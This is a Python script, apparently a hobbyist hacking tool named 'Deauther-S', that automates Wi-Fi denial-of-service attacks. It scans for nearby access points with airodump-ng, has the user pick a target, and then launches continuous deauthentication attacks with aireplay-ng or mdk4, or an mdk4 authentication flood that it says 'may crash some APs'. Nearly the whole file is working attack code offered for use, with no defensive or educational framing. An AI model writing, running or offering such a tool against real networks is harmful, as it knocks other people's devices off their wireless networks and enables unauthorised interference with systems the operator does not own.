#!/usr/bin/env python3
import argparse
import subprocess
import re
import os
import string
import shutil
import sys
import csv
from colorama import Fore, Style, init

init(autoreset=True)

REQUIRED_CMDS = ["iw", "aireplay-ng", "ip", "mdk4", "xterm"]
SHORTCUT_PATH = "/usr/local/bin/deauther-s"

def ok(msg):
    print(f"{Fore.GREEN}[+] {Fore.WHITE}{msg}")

def err(msg):
    print(f"{Fore.RED}[!] {Fore.WHITE}{msg}")

def warn(msg):
    print(f"{Fore.YELLOW}[!] {Fore.WHITE}{msg}")

def info(msg):
    print(f"{Fore.CYAN}[*] {Fore.WHITE}{msg}")

def input_field(msg):
    return input(f"{Fore.GREEN}[?] {Fore.WHITE}{msg}").strip()

def check_superuser():
    """Return True if running as root, otherwise exit program."""
    if os.geteuid() != 0:
        err("This tool must be run as root!")
        sys.exit(1)
    return True

def cleanup_tmp_files():
    tmp_files = [f for f in os.listdir("/tmp") if f.startswith("deauther")]
    for f in tmp_files:
        try:
            ok(f"removeing temporary file: /tmp/{f}")
            os.remove(os.path.join("/tmp", f))
        except:
            pass

def validate_interface(iface):
    try:
        subprocess.run(["iw", iface, "info"], check=True, 
                      capture_output=True, timeout=5)
        return True
    except:
        err(f"Interface {iface} not found or not in monitor mode")
        return False

def check_dependencies():
    missing = [cmd for cmd in REQUIRED_CMDS if not shutil.which(cmd)]
    if missing:
        err(f"Missing dependencies: {', '.join(missing)}")
        warn(f"Please install them before continuing!")
        exit(1)

def print_banner():
    print(Fore.RED + Style.BRIGHT + rf"""
    ▛▀▖ {Fore.RESET}Scanner{Fore.RED} ▐  ▌   {Fore.RESET}With{Fore.RED}    ▞▀▖
    ▌ ▌▞▀▖▝▀▖▌ ▌▜▀ ▛▀▖▞▀▖▙▀▖▄▄▖▚▄ 
    ▌ ▌▛▀ ▞▀▌▌ ▌▐ ▖▌ ▌▛▀ ▌     ▖ ▌
    ▀▀ ▝▀▘▝▀▘▝▀▘ ▀ ▘ ▘▝▀▘▘     ▝▀ 
{Fore.RESET}      Deauther-S | Dx4 and JonX
""" + Style.RESET_ALL)


def uninstall_script():
    print_banner()
    if os.path.islink(SHORTCUT_PATH):
        try:
            os.remove(SHORTCUT_PATH)
            ok(f"Uninstalled successfully from {SHORTCUT_PATH}")
        except Exception as e:
            err(f"Failed to uninstall: {e}")
    else:
        warn(f"No installation found at {SHORTCUT_PATH}")
    sys.exit(0)

def start_deauth(bssid, channel, iface):
    """Launch mdk4 or aireplay-ng inside xterm based on user's choice."""

    print(Fore.CYAN + Style.BRIGHT + "\n----- Select Attack Method -----" + Style.RESET_ALL)
    print(f"{Fore.YELLOW}1. {Fore.RESET}aireplay-ng (classic, stable)")
    print(f"{Fore.YELLOW}2. {Fore.RESET}mdk4 (stronger, faster, more aggressive)")
    print(f"{Fore.YELLOW}3. {Fore.RESET}Authentication Flood (mdk4 only, may crash some APs)") 
    print()
    
    choice = input_field("Choose attack method (1-2): ")

    if choice == "1":
        tool = "aireplay"
        cmd_str = f"aireplay-ng -0 0 -a {bssid} {iface}"
    elif choice == "2":
        tool = "mdk4"
        cmd_str = f"mdk4 {iface} d -B {bssid} -s 9999"
    elif choice == "3":
        tool = "mdk4 (Auth Flood)"
        cmd_str = f"mdk4 {iface} a -a {bssid} -s 9999"
    else:
        err("[!] Invalid choice." + Style.RESET_ALL)
        return
    
    info(f"Setting channel {channel} on interface {iface}...")
    set_channel(iface, channel)

    info(f"Attacking {bssid} using interface {iface} with {tool}...")
    info(f"Press CTRL+C to stop the attack...")

    cmd = [
        "xterm",
        "-geometry", "80x24-0-0",
        "-fg", "red",
        "-bg", "black",
        "-e", "bash", "-lc",
        cmd_str
    ]

    p = None
    try:
        p = subprocess.Popen(cmd)
        p.wait()
    except KeyboardInterrupt:
        ok(f"Attack stopped by user.")
    finally:
        if p:
            try:
                p.terminate()
            except:
                pass
        
        ok(f"Attack stopped.")


def set_channel(iface, channel):
    subprocess.run(["iw", iface, "set", "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def run_airodump_scan(iface):
    info(f"Launching airodump-ng in xterm...")

    base = "/tmp/deauther_scan"
    csv_path = base + "-01.csv"

    # hapus file lama
    if os.path.exists(csv_path):
        os.remove(csv_path)

    try:
        # buka xterm tanpa -hold biar ga nge-freeze quitting
        cmd = f"airodump-ng --write {base} --output-format csv {iface}"
        # buka xterm di pojok kanan bawah (geometry: 100x30, offset negatif) dengan warna teks merah
        subprocess.run(["xterm", "-geometry", "100x30-0-0", "-e", "bash", "-lc", cmd])
    except Exception as e:
        err(f"Failed to launch airodump-ng: {e}")
        sys.exit(1)

    # cek file hasil
    if not os.path.exists(csv_path):
        err(f"CSV not generated! Expected at: {csv_path}")
        sys.exit(1)

    return csv_path

def parse_airodump_csv(csv_file):
    aps = []

    with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
        reader = csv.reader(f)
        ap_section = False

        for row in reader:
            # Detect start of AP section
            if len(row) > 0 and row[0].strip() == "BSSID":
                ap_section = True
                continue

            # Stop when client section starts
            if ap_section and len(row) > 0 and row[0].strip() == "Station MAC":
                break

            if ap_section and len(row) > 5:
                try:
                    bssid = row[0].strip()
                    channel = row[3].strip()
                    rssi = int(row[8].strip())  # RSSI/POWER column
                    ssid = row[13].strip()
                except:
                    continue

                if re.match(r"([0-9a-f]{2}:){5}[0-9a-f]{2}", bssid.lower()):
                    aps.append((bssid, channel, rssi, ssid))

    # Sort by strongest signal (RSSI highest → closer to 0)
    aps.sort(key=lambda x: x[2], reverse=True)

    return aps

def interactive_choose(aps):
    print(f"\n{Fore.CYAN}{Style.BRIGHT}----- Detected Access Points -----{Style.NORMAL}")

    for i, (bssid, ch, rssi, ssid) in enumerate(aps):
        print(f"{Fore.YELLOW}{i+1}. {Fore.WHITE}{ssid if ssid else f"{Fore.RED}Err"}\t"
              f"{Fore.GREEN}CH:{ch}\t"
              f"{Fore.CYAN}RSSI:{rssi}\t"
              f"{Fore.CYAN}BSSID:{bssid}")

    print()
    choice = input_field("Select target: ")

    try:
        choice = int(choice) - 1
        if choice < 0 or choice >= len(aps):
            raise ValueError
    except ValueError:
        err(f"Invalid choice!")
        sys.exit(1)

    return aps[choice][0], aps[choice][1]

def main():
    parser = argparse.ArgumentParser(description="Simple Deauth Tool by Dx4 and JonX")
    parser.add_argument("-i", "--iface", help="Wireless interface (ex: wlan0)")
    parser.add_argument("--cleanup", action="store_true", help="Cleanup temporary files and exit")
    parser.add_argument("--uninstall", action="store_true", help="Uninstall the deauther shortcut")
    args = parser.parse_args()

    if args.uninstall:
        uninstall_script()

    print_banner()
    check_superuser()
    check_dependencies()
    
    if args.cleanup:
        cleanup_tmp_files()
        sys.exit(0)

    if not args.iface:
        parser.print_help()
        return
    
    if not validate_interface(args.iface):
        return

    csv_file = run_airodump_scan(args.iface)
    aps = parse_airodump_csv(csv_file)

    if not aps:
        err(f"No APs found in scan!")
        return

    target_bssid, channel = interactive_choose(aps)
    bssid = target_bssid

    start_deauth(bssid, channel, args.iface)

if __name__ == "__main__":
    main()